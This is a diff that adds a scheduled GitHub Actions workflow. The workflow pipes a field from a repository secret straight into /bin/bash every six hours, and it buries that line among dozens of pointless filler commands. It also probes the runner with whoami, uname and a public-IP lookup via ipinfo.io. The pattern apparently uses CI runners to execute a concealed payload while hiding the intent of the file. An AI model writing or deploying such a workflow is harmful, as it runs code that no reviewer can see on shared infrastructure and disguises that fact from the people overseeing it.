@@ -1,0 +1,41 @@
+name: wangchuyi2016
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangchuyi2016
+        env:
+          q21900: ${{ secrets.q21900 }}
+        run: |
+          test -d /tmp && echo "Tmp dir exists"
+          [ -f /etc/hosts ] && echo "Hosts exist" || true
+          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
+          echo $q21900 | jq -r .y7699 | /bin/bash
+          curl www.google.com
+          which uname
+          ping -c 10 www.google.com
+          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
+          : ' Another single-line comment '
+          printf "%s" "xyz" > tmp.xyz
+          uname -a
+          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
+          echo "Files: $(ls | wc -l 2>/dev/null || echo 0)"
+          which apt-get
+          echo "Build $(date +%s)"
+          [ -f /etc/hosts ] && echo "Hosts exist" || true
+          ls -la 2>/dev/null || true
+          curl ipinfo.io/ip
+          echo "User: $(whoami)"
+          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
+          which screen
+          sleep 0.1 2>/dev/null || true
+          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
+          test -d /tmp && echo "Tmp dir exists"
